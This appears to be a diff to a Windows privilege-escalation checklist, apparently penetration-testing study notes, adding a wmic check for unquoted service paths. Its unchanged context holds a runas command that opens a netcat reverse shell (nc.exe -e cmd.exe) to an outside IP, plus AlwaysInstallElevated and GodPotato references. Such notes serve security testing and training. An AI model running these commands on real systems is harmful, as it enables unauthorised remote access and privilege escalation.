@@ -20,6 +20,10 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 ```
 runas /user:administrator "C:\users\viewer\desktop\nc.exe -e cmd.exe 192.168.49.57 443"
 ```
+- [ ] Check Unqouted Path Service
+```
+wmic service get name,displayname,pathname,startmode |findstr /i "auto"
+```
 
 # SeImpersonatePrivilege
 - [GodPotato](https://github.com/BeichenDream/GodPotato)
